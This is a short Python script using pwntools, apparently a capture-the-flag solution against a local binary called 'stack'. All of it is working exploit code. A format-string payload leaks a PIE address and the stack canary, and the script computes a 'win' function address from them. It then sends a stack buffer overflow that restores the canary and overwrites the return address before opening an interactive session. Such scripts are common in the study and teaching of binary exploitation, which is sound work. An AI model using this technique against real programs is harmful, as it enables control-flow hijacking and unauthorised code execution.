from pwn import * 

p = process("./stack")

print(p.recvline())
print(p.recvuntil(b":"))
p.sendline(b"%75$p%91$p")

main_off = 0x1210
win_off =  0x11fa 

off = 264 

data = p.recvline()[:-1].split(b':')[1]
print("[DATA]" , data)

main , canary = int(b'0x'+data.split(b"0x")[1],16) , int(b"0x"+data.split(b"0x")[2],16)
print("[MAIN]" , hex(main))
print("[CANARY]" , hex(canary))


pie_base = main - main_off
print("[PIE]" , hex(pie_base))

win = pie_base + win_off
print("[WIN]" , hex(win))

ret = pie_base + 0x101a

#pause()
p.send(b'A' * off + p64(canary) + b'A' * 8 + p64(ret) + p64(win))


p.interactive()